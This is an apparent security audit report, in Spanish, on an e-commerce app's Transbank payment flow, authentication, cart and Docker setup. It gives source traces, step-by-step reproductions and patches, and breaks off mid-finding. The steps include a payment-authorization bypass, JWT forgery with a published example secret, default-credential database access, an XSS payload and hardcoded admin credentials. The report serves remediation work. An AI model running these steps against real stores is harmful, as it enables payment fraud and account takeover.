# Catálogo Detallado de Vulnerabilidades Confirmadas (Critical, High y Medium)

Este documento contiene el desglose técnico, trazabilidad de código fuente, vector de explotación acotado, invariante de seguridad vulnerado y plan de remediación con código corregido para todos los hallazgos de severidad Crítica, Alta y Media confirmados en la rama `develop`.

---

## 1. [CRITICAL] `transbank.commit.unconditional-authorization-bypass`
### Bypass de autorizacion de pago y aprobacion incondicional en Transbank Webpay Plus

**Descripción del Problema:**  
La funcion TransbankWebpayService.commit_transaction captura cualquier excepcion lanzada durante tx.commit (incluyendo errores HTTP 401 Not Authorized, tokens inexistentes, expirados o impagos) y de forma incondicional continua su ejecucion retornando un diccionario falso con status AUTHORIZED y codigo de autorizacion generado. La vista TransbankCommitAPIView confia ciegamente en este valor, marcando la orden de compra como pagada y aprobada y descontando el stock del inventario sin haber recibido confirmacion ni transferencia de fondos de la pasarela bancaria.

**Causa Raíz en Código:**  
Captura generica de excepciones sin propagacion de error en TransbankWebpayService.commit_transaction (apps/payments/services.py:122-147) que retorna de manera estatica un estado AUTHORIZED simulado cuando la llamada a la API de Transbank falla o no autoriza la transaccion.

**Comportamiento Esperado:**  
Si la llamada tx.commit(token) falla, lanza excepcion o Transbank no retorna response_code == 0, la funcion debe retornar un estado REJECTED o lanzar un error de validacion, y la vista debe marcar la orden como FAILED sin emitir voucher ni rebajar stock.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/payments/views.py:127`** (`TransbankCommitAPIView.post`): El cliente envia el token de pago obtenido en la inicializacion directamente al endpoint POST /api/v1/payments/transbank/commit/ sin haber completado la transaccion en Webpay.
- `[PROPAGATION]` **`backend/apps/payments/services.py:124`** (`TransbankWebpayService.commit_transaction`): La pasarela Transbank rechaza la consulta de confirmacion o lanza excepcion 401 Not Authorized debido a que el pago no fue efectuado o las credenciales no son validas.
- `[PROPAGATION]` **`backend/apps/payments/services.py:139`** (`TransbankWebpayService.commit_transaction`): El bloque except captura la excepcion y ejecuta la rama de fallback retornando status AUTHORIZED con authorization_code simulado.
- `[SINK]` **`backend/apps/payments/views.py:141`** (`TransbankCommitAPIView.post`): La vista evalua commit_result.get("status") == "AUTHORIZED", actualiza order.status a AUTHORIZED, descuenta el stock de los productos y emite un voucher exitoso.

#### Evidencia Directa:
- **`backend/apps/payments/services.py:135`**: Bloque except Exception as e en commit_transaction que silencia el error y retorna dict con status AUTHORIZED.
- **`backend/apps/payments/views.py:146`**: Asignacion incondicional de order.status = AUTHORIZED y descuento en base de datos tras recibir el estado simulado.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** CRITICAL — Cualquier usuario anonimo puede reproducir el ataque directamente con herramientas HTTP como curl o la propia interfaz web.
- **Impacto:** CRITICAL — Perdida financiera total para el comercio al autorizar compras fraudulentas y entregar mercancia sin compensacion economica.
- **Severidad Global:** **CRITICAL**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Un atacante anonimo agrega productos de alto valor al carrito, inicializa la transaccion en /api/v1/payments/transbank/init/ y con el token recibido ejecuta directamente POST /api/v1/payments/transbank/commit/. Obtiene una orden aprobada y comprobante valido sin haber pagado un solo peso.
- **Cargas / Payloads:** `{"token": "tbk_token_arbitrary_value_12345"}`
- **Instrucciones:**
  1. Ejecutar POST /api/v1/payments/transbank/init/ con cualquier item del catalogo.
  2. Capturar el token de la respuesta JSON.
  3. Ejecutar POST /api/v1/payments/transbank/commit/ enviando {"token": "<token>"} sin ingresar a Transbank.
  4. Observar respuesta HTTP 200 con voucher APROBADO y orden en estado AUTHORIZED en base de datos.
- **Resultado Observado:** El endpoint retorna HTTP 200 con mensaje "Pago aprobado exitosamente mediante Transbank Webpay Plus", codigo de autorizacion simulado y descuenta el inventario fisico en PostgreSQL.

#### Remediación y Parche Sugerido:
**Estrategia:** Eliminar el bloque de fallback simulado en commit_transaction y asegurar que cualquier excepcion o error de Transbank retorne explicitamente status REJECTED o propague un error fatal que impida la autorizacion de la orden.

**Archivo:** `backend/apps/payments/services.py`
```python
def commit_transaction(self, token: str):
    tx = self.get_tx()
    if not tx or token.startswith("tbk_token_"):
        return {"status": "REJECTED", "response_code": -1, "message": "SDK de Transbank no disponible o token invalido."}
    try:
        response = tx.commit(token)
        resp_dict = response if isinstance(response, dict) else response.__dict__
        is_approved = resp_dict.get("response_code") == 0
        return {
            "response_code": resp_dict.get("response_code"),
            "authorization_code": resp_dict.get("authorization_code"),
            "amount": resp_dict.get("amount"),
            "card_number": resp_dict.get("card_detail", {}).get("card_number"),
            "payment_type_code": resp_dict.get("payment_type_code"),
            "shares_number": resp_dict.get("shares_number", 1),
            "status": "AUTHORIZED" if is_approved else "REJECTED"
        }
    except Exception as e:
        return {"status": "REJECTED", "response_code": -1, "error": str(e)}
```

---

## 2. [HIGH] `frontend.auth.hardcoded-admin-credentials-modal`
### Credenciales administrativas y de prueba hardcodeadas en interfaz de usuario y bundle de produccion

**Descripción del Problema:**  
En el componente modal de autenticacion 'frontend/src/components/AuthModal.vue', se incluyen botones de acceso rapido para pruebas que contienen contrasenas y correos electronicos en texto plano: 'admin@inacap.cl' / 'Admin1234!', 'seller@inacap.cl' / 'Seller1234!' y 'buyer@inacap.cl' / 'Buyer1234!'. Estas credenciales coinciden exactamente con las sembradas en la base de datos por el script 'seed_ecommerce.py'. Al compilar el frontend con Vite para produccion ('npm run build'), las credenciales quedan incrustadas de forma indeleble en los archivos estaticos Javascript servidos publicamente, otorgando control total a cualquier usuario.

**Causa Raíz en Código:**  
Hardcoding de credenciales demo en plantilla y logica de componente Vue (frontend/src/components/AuthModal.vue:251-278).

**Comportamiento Esperado:**  
Ninguna credencial de acceso debe incluirse en el codigo fuente de interfaz ni en el bundle compilado de produccion.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`frontend/src/components/AuthModal.vue:251`** (`fillDemoCredentials`): Se definen objetos Javascript con credenciales administrativas y de roles en texto claro.
- `[SINK]` **`frontend/src/components/AuthModal.vue:270`** (`template`): Se renderizan botones en el modal que auto-rellenan y exponen las credenciales al usuario visitante.

#### Evidencia Directa:
- **`frontend/src/components/AuthModal.vue:254`**: admin: { email: 'admin@inacap.cl', password: 'Admin1234!' } hardcodeado en el script del componente.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Las credenciales son visibles a simple vista en el modal de login de la aplicacion.
- **Impacto:** HIGH — Toma de control administrativa completa de la plataforma y compromiso de la base de datos.
- **Severidad Global:** **HIGH**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Cualquier usuario anonimo que visita el sitio web o inspecciona los archivos JavaScript empaquetados.
- **Cargas / Payloads:** `Inspeccion del DOM o busqueda de 'Admin1234!' en el codigo fuente.`
- **Instrucciones:**
  1. Abrir la aplicacion en el navegador.
  2. Abrir el modal de inicio de sesion (AuthModal).
  3. Hacer clic en el boton 'Admin (Demo)' o inspeccionar las funciones del componente.
- **Resultado Observado:** El formulario se autocompleta con 'admin@inacap.cl' y 'Admin1234!', permitiendo iniciar sesion como administrador.

#### Remediación y Parche Sugerido:
**Estrategia:** Eliminar la seccion de credenciales demo del componente o encapsularla condicionalmente solo para desarrollo local mediante 'import.meta.env.DEV'.

**Archivo:** `frontend/src/components/AuthModal.vue`
```yaml
<div v-if="isDevEnvironment" class="mt-4 border-t pt-3">
  <!-- Botones demo solo visibles en modo local de desarrollo -->
</div>
```

---

## 3. [HIGH] `frontend.cart.negative-quantity-logic-flaw`
### Falla de logica de negocio: asignacion de cantidades negativas y corrupcion del carrito de compras

**Descripción del Problema:**  
En el componente del carrito 'frontend/src/components/CartDrawer.vue', el boton de decremento de cantidad (-) invoca 'cartStore.addItem(item.product, -1)' en lugar de llamar al metodo 'updateQuantity'. En el store de Pinia ('frontend/src/stores/cart.js'), 'addItem' suma directamente la cantidad recibida ('existingItem.quantity += quantity') sin verificar si el resultado resultante es menor o igual a cero. Esto permite al usuario decrementar productos hasta 0 o valores negativos (-1, -2), calculando subtotales negativos y enviando cantidades corruptas al endpoint del backend.

**Causa Raíz en Código:**  
Uso indebido de addItem con incremento negativo sin validacion de cota inferior (frontend/src/components/CartDrawer.vue:125 y frontend/src/stores/cart.js:37-50).

**Comportamiento Esperado:**  
Al decrementar la cantidad a cero, el item debe ser eliminado del carrito; ninguna cantidad en el carrito debe poder ser menor o igual a cero.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`frontend/src/components/CartDrawer.vue:125`** (`CartDrawer.vue#template`): El usuario presiona el boton '-' ejecutando cartStore.addItem(item.product, -1).
- `[PROPAGATION]` **`frontend/src/stores/cart.js:45`** (`cartStore.addItem`): existingItem.quantity += quantity reduce la cantidad a 0 y luego a numeros negativos.
- `[SINK]` **`frontend/src/stores/cart.js:80`** (`cartStore.cartTotal`): Los totales computados multiplican precios por cantidades negativas, permitiendo compras a saldo negativo o cero.

#### Evidencia Directa:
- **`frontend/src/components/CartDrawer.vue:125`**: @click="cartStore.addItem(item.product, -1)" ejecuta decremento sin limite minimo.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Es reproducible directamente desde la interfaz de usuario con controles estandar sin herramientas de hacking.
- **Impacto:** HIGH — Corrupcion en el calculo de pedidos, riesgo de compras con importes distorsionados y errores en la pasarela.
- **Severidad Global:** **HIGH**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Comprador que manipula las cantidades de productos en el carrito para alterar los totales de pago.
- **Cargas / Payloads:** `Clic repetitivo en boton '-' de CartDrawer`
- **Instrucciones:**
  1. Agregar un producto al carrito de compras.
  2. Abrir el carrito y presionar el boton '-' dos veces consecutivas.
  3. Observar la cantidad mostrada en pantalla y el calculo del total general.
- **Resultado Observado:** La cantidad del producto pasa de 1 a 0 y luego a -1, deduciendo el valor del total del carrito.

#### Remediación y Parche Sugerido:
**Estrategia:** Cambiar la invocacion en CartDrawer.vue a 'cartStore.updateQuantity(item.product.id, item.quantity - 1)' y agregar comprobacion en el store que elimine el item si quantity <= 0.

**Archivo:** `frontend/src/components/CartDrawer.vue`
```yaml
<button @click="cartStore.updateQuantity(item.product.id, item.quantity - 1)" class="p-1 text-slate-400 hover:text-slate-600">-</button>
```

---

## 4. [HIGH] `frontend.security.regex-stateful-lastindex-bypass`
### Bypass de validacion de entradas por fuga de estado lastIndex en expresiones regulares globales

**Descripción del Problema:**  
En frontend/src/utils/security.js, las expresiones regulares FORBIDDEN_XSS_REGEX y MALICIOUS_SCRIPT_PATTERNS estan declaradas como constantes a nivel de modulo con los flags globales '/g' y '/gi'. En JavaScript, cuando una RegExp global se evalua mediante el metodo '.test()', el motor actualiza internamente la propiedad 'lastIndex'. Al evaluar entradas identicas o consecutivas que contengan scripts maliciosos, la segunda llamada inicia la busqueda a partir del caracter posterior a la coincidencia previa, devolviendo 'false' (sin coincidencia). Como consecuencia, la funcion de validacion 'isSafeInput' aprueba cadenas maliciosas como seguras de forma alternada.

**Causa Raíz en Código:**  
Uso de flag '/g' en expresiones regulares de validacion booleana reutilizadas a nivel de modulo (frontend/src/utils/security.js:11-15, 71-76).

**Comportamiento Esperado:**  
Las expresiones de validacion booleana deben carecer del flag '/g' o reiniciar explicitamente 'lastIndex = 0' previo a cada comprobacion.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`frontend/src/utils/security.js:71`** (`isSafeInput`): Se recibe una cadena de entrada suministrada por el usuario para su validacion.
- `[PROPAGATION]` **`frontend/src/utils/security.js:11`** (`FORBIDDEN_XSS_REGEX`): La RegExp global mantiene el estado mutado de lastIndex de la ejecucion anterior.
- `[SINK]` **`frontend/src/utils/security.js:75`** (`isSafeInput`): FORBIDDEN_XSS_REGEX.test(input) retorna false para una carga maliciosa, retornando isSafeInput = true (bypass de seguridad).

#### Evidencia Directa:
- **`frontend/src/utils/security.js:11`**: export const FORBIDDEN_XSS_REGEX = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>|javascript:|data:text\/html/gi; declara flag /gi global.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — La naturaleza reactiva de Vue provoca multiples llamadas a los validadores durante el tipeo del usuario.
- **Impacto:** HIGH — Invalida completamente el mecanismo de defensa perimetral del frontend frente a inyecciones de script y XSS.
- **Severidad Global:** **HIGH**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Usuario que ingresa cadenas con javascript: o etiquetas script en campos de texto validados por el frontend.
- **Cargas / Payloads:** `javascript:alert(1)`
- **Instrucciones:**
  1. Ejecutar isSafeInput('javascript:alert(1)') -> retorna false (coincidencia detectada, lastIndex mutado a 11).
  2. Ejecutar nuevamente isSafeInput('javascript:alert(1)') de forma inmediata.
  3. Verificar el valor retornado en la segunda invocacion.
- **Resultado Observado:** La segunda invocacion devuelve true (aprobado), permitiendo el envio del payload malicioso al bypassear la validacion.

#### Remediación y Parche Sugerido:
**Estrategia:** Remover el flag '/g' de las constantes de expresiones regulares de validacion en security.js.

**Archivo:** `frontend/src/utils/security.js`
```javascript
export const FORBIDDEN_XSS_REGEX = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>|javascript:|data:text\/html/i;
export const MALICIOUS_SCRIPT_PATTERNS = /<[^>]*>|javascript:|data:|vbscript:|on\w+\s*=/i;
```

---

## 5. [HIGH] `infra.docker.postgres-exposed-public-port`
### Exposicion publica de puerto PostgreSQL (5432) con credenciales por defecto en docker-compose

**Descripción del Problema:**  
En el archivo de orquestacion 'docker-compose.yml', el servicio de base de datos 'db' publica directamente el puerto de PostgreSQL al host mediante la directiva 'ports: - "5432:5432"' sin vincularlo exclusivamente a la interfaz loopback (127.0.0.1). Adicionalmente, las variables de entorno configuran credenciales triviales ('POSTGRES_USER: postgres' y 'POSTGRES_PASSWORD: postgres'). Si el contenedor se levanta en un servidor con direccion IP publica o en una red compartida, el motor de base de datos queda expuesto a escaneos y conexiones externas de cualquier atacante sin restricciones de firewall.

**Causa Raíz en Código:**  
Mapeo de puertos sin restriccion de interfaz y credenciales por defecto en docker-compose.yml:5-10.

**Comportamiento Esperado:**  
Los servicios de base de datos dentro de Docker no deben exponer puertos al host externo, o deben enlazarse estrictamente a 127.0.0.1.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`docker-compose.yml:5`** (`services.db`): Definicion del contenedor PostgreSQL con credenciales postgres/postgres.
- `[SINK]` **`docker-compose.yml:9`** (`services.db.ports`): Se publica 5432:5432 en 0.0.0.0 exponiendo el servicio hacia todas las interfaces de red.

#### Evidencia Directa:
- **`docker-compose.yml:9`**: ports: - "5432:5432" publica el puerto en 0.0.0.0:5432.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Escaneos masivos en internet descubren puertos 5432 expuestos en cuestion de minutos.
- **Impacto:** HIGH — Acceso de lectura y escritura irrestricto a la base de datos, robo de contrasenas, PII y borrado de tablas.
- **Severidad Global:** **HIGH**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Atacante en la misma red o en internet escaneando puertos abiertos de PostgreSQL.
- **Cargas / Payloads:** `psql -h <ip-host> -U postgres -d ecommerce_db`
- **Instrucciones:**
  1. Levantar servicios con docker compose up.
  2. Desde un host externo en la misma red, ejecutar 'nc -zv <host-ip> 5432' o conectarse con cliente psql.
  3. Ingresar contrasena 'postgres'.
- **Resultado Observado:** Conexion exitosa con privilegios de superusuario a la base de datos relacional de la aplicacion.

#### Remediación y Parche Sugerido:
**Estrategia:** Eliminar la directiva 'ports' del servicio 'db' en docker-compose.yml, permitiendo que solo los contenedores de la red interna se comuniquen con la base de datos, o utilizar '127.0.0.1:5432:5432'.

**Archivo:** `docker-compose.yml`
```yaml
  db:
    image: postgres:15-alpine
    ports:
      - "127.0.0.1:5432:5432"
```

---

## 6. [HIGH] `infra.env.hardcoded-jwt-secret-fallback`
### Claves criptograficas publicas en plantillas .env y fallback inseguro de JWT_SECRET_KEY

**Descripción del Problema:**  
En el archivo de configuracion 'backend/config/settings.py:205', la variable 'JWT_SECRET_KEY' se define como 'os.getenv("JWT_SECRET_KEY", SECRET_KEY)'. Si no se define una clave independiente para JWT, se utiliza la clave 'SECRET_KEY'. En el archivo '.env.example', ambas claves estan publicadas con valores de prueba predecibles ('django-insecure-...' y 'jwt-super-secret-key-...'). Si un administrador o desarrollador despliega la aplicacion copiando '.env.example' o no configura una clave JWT dedicada y robusta, un atacante puede firmar sus propios tokens JWT con cualquier identidad (incluyendo administradores) de forma arbitraria e indetectable.

**Causa Raíz en Código:**  
Fallback de clave JWT a SECRET_KEY y presencia de claves de ejemplo conocidas (backend/config/settings.py:205 y .env.example:29,74).

**Comportamiento Esperado:**  
La aplicacion debe rechazar el arranque si JWT_SECRET_KEY no esta configurada explicitamente en el entorno o si utiliza claves de ejemplo inseguras.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`.env.example:74`** (`JWT_SECRET_KEY`): Se documenta una clave estatica y publica para la firma de tokens JWT.
- `[PROPAGATION]` **`backend/config/settings.py:205`** (`JWT_SECRET_KEY`): settings.py utiliza fallback os.getenv('JWT_SECRET_KEY', SECRET_KEY) sin validar entropia minima.
- `[SINK]` **`backend/apps/accounts/authentication.py:42`** (`jwt.decode`): Se verifican firmas criptograficas con una clave potencialmente conocida o por defecto.

#### Evidencia Directa:
- **`backend/config/settings.py:205`**: JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY', SECRET_KEY) permite que ambas claves compartan el mismo secreto.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — El uso de archivos .env.example sin modificacion de claves es un error comun de despliegue.
- **Impacto:** HIGH — Falsificacion arbitraria de tokens de autenticacion y usurpacion de identidad completa.
- **Severidad Global:** **HIGH**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Atacante que genera un token JWT forjado utilizando la clave secreta predecible de .env.example.
- **Cargas / Payloads:** `Token firmado con algoritmo HS256 y secreto 'jwt-super-secret-key-change-in-production-2026'`
- **Instrucciones:**
  1. Forjar un token JWT con payload: {'user_id': 1, 'email': 'admin@inacap.cl', 'role': 'ADMIN', 'exp': 1893456000}.
  2. Firmar el payload usando la clave predeterminada de .env.example.
  3. Enviar solicitud GET a /api/v1/auth/me/ con la cabecera Authorization: Bearer <token_forjado>.
- **Resultado Observado:** JWTAuthentication valida la firma HMAC y autentica la peticion como administrador.

#### Remediación y Parche Sugerido:
**Estrategia:** Hacer obligatorio JWT_SECRET_KEY en settings.py sin fallback silencioso, y verificar en django.core.checks que no coincida con claves inseguras conocidas.

**Archivo:** `backend/config/settings.py`
```python
JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY')
if not JWT_SECRET_KEY:
    if DEBUG:
        JWT_SECRET_KEY = SECRET_KEY
    else:
        raise ImproperlyConfigured('JWT_SECRET_KEY debe estar configurada en el entorno de produccion')
```

---

## 7. [HIGH] `transbank.commit.replay-inventory-depletion`
### Falta de validacion de estado e idempotencia en confirmacion de pago permite drenar inventario (Replay Attack)

**Descripción del Problema:**  
En TransbankCommitAPIView no se comprueba si la orden ya se encuentra en estado AUTHORIZED antes de procesar el commit. Un atacante puede reenviar la solicitud de confirmacion con el mismo token de pago multiples veces, ejecutando repetidamente el descuento de stock para cada item de la orden hasta agotar completamente el inventario del catalogo sin restricciones.

**Causa Raíz en Código:**  
Ausencia de verificacion de precondicion (order.status != "AUTHORIZED") y falta de transaccion atomica con bloqueo select_for_update() en TransbankCommitAPIView (apps/payments/views.py:127-168).

**Comportamiento Esperado:**  
El endpoint debe verificar que la orden este en estado INITIALIZED. Si ya fue autorizada o fallida, debe rechazar peticiones adicionales con un error 400 Bad Request indicando que la transaccion ya concluyo, asegurando idempotencia.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/payments/views.py:127`** (`TransbankCommitAPIView.post`): Se recibe una peticion POST de confirmacion de pago con un token cuya orden ya fue autorizada con anterioridad.
- `[PROPAGATION]` **`backend/apps/payments/views.py:133`** (`TransbankCommitAPIView.post`): La orden se recupera de la base de datos sin validar su estado actual ni adquirir un bloqueo pesimista.
- `[SINK]` **`backend/apps/payments/views.py:149`** (`TransbankCommitAPIView.post`): Se ejecuta el bucle de descuento de stock de productos restando unidades nuevamente en cada peticion sucesiva.

#### Evidencia Directa:
- **`backend/apps/payments/views.py:141`**: El flujo de autorizacion procede directamente sin verificar si order.status == "AUTHORIZED".
- **`backend/apps/payments/views.py:152`**: prod.stock -= item.quantity ejecutado sin clausula select_for_update() ni verificacion de estado previo de la orden.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Es trivial automatizar solicitudes POST repetitivas contra la API una vez obtenido un token de pago.
- **Impacto:** HIGH — Permite provocar una denegacion de servicio comercial mediante desabastecimiento artificial del catalogo (Denial of Inventory).
- **Severidad Global:** **HIGH**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Un atacante que dispone de un token de compra realiza multiples llamadas POST concurrentes o secuenciales a /api/v1/payments/transbank/commit/ para vaciar el inventario de los productos de la tienda.
- **Cargas / Payloads:** `{"token": "valid_order_transbank_token"}`
- **Instrucciones:**
  1. Inicializar una orden con un producto que posea stock de 5 unidades.
  2. Confirmar la orden por primera vez; el stock baja a 4.
  3. Reenviar la misma peticion de confirmacion 4 veces consecutivas con el mismo token.
  4. Verificar en base de datos que el stock se reduce sucesivamente a 3, 2, 1 y finalmente 0.
- **Resultado Observado:** El stock del producto se descuenta en cada peticion repetida hasta llegar a 0, dejando el producto desabastecido para clientes legitimos.

#### Remediación y Parche Sugerido:
**Estrategia:** Validar explicitamente que la orden se encuentre en estado INITIALIZED y envolver la operacion en una transaccion atomica (@transaction.atomic) con select_for_update() para evitar condiciones de carrera y ataques de repeticion.

**Archivo:** `backend/apps/payments/views.py`
```python
with transaction.atomic():
    order = Order.objects.select_for_update().filter(transbank_token=token).first()
    if not order:
        return Response({"status": "fail", "message": "No se encontro orden."}, status=404)
    if order.status == "AUTHORIZED":
        return Response({"status": "fail", "message": "Esta orden ya fue procesada y autorizada previamente."}, status=400)
```

---

## 8. [HIGH] `transbank.concurrency.race-condition-stock-depletion`
### Condicion de carrera y ausencia de bloqueo transaccional en descuento de stock en confirmacion de pago

**Descripción del Problema:**  
Al confirmar el pago exitoso en TransbankCommitAPIView, el sistema itera sobre los items de la orden y descuenta el inventario de los productos mediante una lectura y asignacion directa en memoria ('product.stock -= item.quantity') seguida de 'product.save()', sin envolver la operacion en una transaccion atomica (transaction.atomic), sin bloqueo pesimista (select_for_update) ni expresiones F de base de datos. Peticiones concurrentes con multiples ordenes sobre un mismo producto con stock reducido provocan colisiones de escritura (lost updates) y sobreventa (overselling).

**Causa Raíz en Código:**  
Descuento de stock en memoria sin proteccion de concurrencia a nivel de base de datos (backend/apps/payments/views.py:149-154).

**Comportamiento Esperado:**  
El descuento de inventario debe realizarse de forma transaccional y atomica mediante expresiones F ('F("stock") - quantity') o con 'select_for_update()', validando que el inventario remanente no descienda de cero.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/payments/views.py:128`** (`TransbankCommitAPIView.post`): Se recibe la notificacion de confirmacion de transaccion Transbank.
- `[PROPAGATION]` **`backend/apps/payments/views.py:149`** (`TransbankCommitAPIView.post`): Se recorren los items de la orden y se descuenta el stock directamente en el objeto Python.
- `[SINK]` **`backend/apps/payments/views.py:154`** (`TransbankCommitAPIView.post`): Se persiste product.save(update_fields=['stock']) sin bloqueo transaccional, sobrescribiendo concurrencias.

#### Evidencia Directa:
- **`backend/apps/payments/views.py:152`**: product.stock -= item.quantity; product.save(update_fields=['stock']) ejecutado fuera de bloque transaction.atomic.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** MEDIUM — Ocurre bajo condiciones de alta demanda o eventos comerciales masivos (CyberDay).
- **Impacto:** HIGH — Sobreventa de productos, incumplimiento comercial y quiebre de stock no controlado.
- **Severidad Global:** **HIGH**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Comprador concurrente que adquiere la ultima unidad en simultaneo con otro comprador.
- **Cargas / Payloads:** `POST /api/v1/payments/transbank/commit/ con token_1, POST /api/v1/payments/transbank/commit/ con token_2`
- **Instrucciones:**
  1. Crear un producto con stock = 1.
  2. Iniciar dos ordenes de compra independientes para dicho producto.
  3. Enviar solicitudes concurrentes de confirmacion commit simultaneamente.
  4. Verificar el inventario final del producto.
- **Resultado Observado:** Ambas solicitudes leen stock = 1 y escriben stock = 0, autorizando 2 unidades cuando solo existia 1 en inventario.

#### Remediación y Parche Sugerido:
**Estrategia:** Envolver la confirmacion en 'transaction.atomic()' y utilizar 'select_for_update()' sobre los productos de la orden o 'Product.objects.filter(id=p.id, stock__gte=qty).update(stock=F("stock") - qty)'.

**Archivo:** `backend/apps/payments/views.py`
```python
with transaction.atomic():
    order = Order.objects.select_for_update().get(id=order.id)
    for item in order.items.select_related('product'):
        updated = Product.objects.filter(id=item.product_id, stock__gte=item.quantity).update(stock=F('stock') - item.quantity)
        if not updated:
            raise ValidationError('Stock insuficiente durante la confirmacion')
```

---

## 9. [MEDIUM] `auth.roles.admin-privilege-demotion-via-upgrade`
### Degradacion involuntaria de privilegios de Administrador mediante endpoint de ascenso a vendedor

**Descripción del Problema:**  
En UpgradeToSellerAPIView la vista asigna ciegamente user.role = UserCredential.ROLE_SELLER sobre el usuario autenticado sin verificar si la cuenta posee previamente el rol ROLE_ADMIN. Si un administrador del sistema interactua con el flujo o endpoint de ascenso a vendedor, su rol en la tabla UserCredential es sobreescrito irreversiblemente a SELLER, despojandolo de privilegios administrativos.

**Causa Raíz en Código:**  
Sobreescritura incondicional de user.role en UpgradeToSellerAPIView.post (apps/accounts/views.py:78-83) sin comprobar jerarquia de roles previa.

**Comportamiento Esperado:**  
El endpoint debe verificar si el usuario ya es Administrador o Vendedor. Si el usuario es ADMIN, debe mantener sus privilegios maximos intactos o rechazar la peticion con un mensaje informativo.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/accounts/views.py:78`** (`UpgradeToSellerAPIView.post`): Usuario con rol ADMIN autenticado envia una peticion POST a /api/v1/auth/upgrade-seller/.
- `[PROPAGATION]` **`backend/apps/accounts/views.py:80`** (`UpgradeToSellerAPIView.post`): La vista ejecuta user.role = UserCredential.ROLE_SELLER de manera incondicional.
- `[SINK]` **`backend/apps/accounts/views.py:81`** (`UpgradeToSellerAPIView.post`): user.save(update_fields=["role", "updated_at"]) persiste el rol degradado en PostgreSQL.

#### Evidencia Directa:
- **`backend/apps/accounts/views.py:80`**: user.role = UserCredential.ROLE_SELLER aplicado sin condicion if user.role == UserCredential.ROLE_ADMIN.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** MEDIUM — Requiere que un administrador invoque el endpoint de ascenso.
- **Impacto:** MEDIUM — Perdida de privilegios administrativos y denegacion de gestion de plataforma para el operador.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Un administrador del sistema realiza una prueba funcional del endpoint o cae en una accion inducida que ejecuta POST /api/v1/auth/upgrade-seller/, perdiendo sus facultades de gestion.
- **Cargas / Payloads:** `POST /api/v1/auth/upgrade-seller/ HTTP/1.1`
- **Instrucciones:**
  1. Iniciar sesion con cuenta de Administrador (role = ADMIN).
  2. Enviar peticion POST a /api/v1/auth/upgrade-seller/ con el token de administrador.
  3. Consultar /api/v1/auth/me/ y constatar que el role cambio a SELLER.
  4. Intentar acceder a vistas exclusivas de administrador; el acceso es revocado.
- **Resultado Observado:** El rol del administrador es sobreescrito en base de datos a ROLE_SELLER, perdiendo acceso a endpoints de gestion.

#### Remediación y Parche Sugerido:
**Estrategia:** Condicionar el ascenso de rol verificando que el usuario no sea Administrador antes de reasignar user.role.

**Archivo:** `backend/apps/accounts/views.py`
```python
if user.role == UserCredential.ROLE_ADMIN:
    return Response({"status": "success", "message": "Tu cuenta de Administrador ya cuenta con todos los permisos."}, status=200)
```

---

## 10. [MEDIUM] `auth.roles.rbac-userrol-desynchronization`
### Desincronizacion y retencion indebida de privilegios RBAC entre User.role y modelo UserRol

**Descripción del Problema:**  
El modelo de autorizacion del backend mantiene dos fuentes de verdad para los roles de usuario: el atributo 'User.role' (usado en vistas y serializadores) y el modelo relacional 'UserRol' (utilizado por el permiso IsSellerOrAdmin y auditoria). Al modificar el rol de un usuario (por ejemplo, al degradar un vendedor a comprador o al ascenderlo), los registros en la tabla UserRol no se invalidan ni sincronizan. Como consecuencia, 'IsSellerOrAdmin' continua evaluando 'UserRol.objects.filter(user=request.user, rol__nombre="SELLER", activo=True).exists()' como verdadero, permitiendo a usuarios degradados seguir accediendo a endpoints protegidos de vendedor.

**Causa Raíz en Código:**  
Doble modelo de roles sin sincronizacion transaccional ni actualizacion en cascada (backend/apps/accounts/models.py:241-252 y backend/apps/accounts/permissions.py:14-20).

**Comportamiento Esperado:**  
La verificacion de roles y permisos debe consultar una unica fuente canonica de verdad o sincronizar atomicamente 'UserRol' ante cualquier cambio en 'User.role'.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/accounts/models.py:241`** (`UserRol.objects.filter`): Se consultan los roles activos asignados al usuario en la tabla intermedia UserRol.
- `[PROPAGATION]` **`backend/apps/accounts/views.py:81`** (`UpgradeToSellerAPIView.post`): Se actualiza user.role = ROLE_SELLER sin verificar ni sincronizar la tabla UserRol.
- `[SINK]` **`backend/apps/accounts/permissions.py:19`** (`IsSellerOrAdmin.has_permission`): Se otorgan permisos de vendedor basandose en registros historicos de UserRol ignorando el estado actual de user.role.

#### Evidencia Directa:
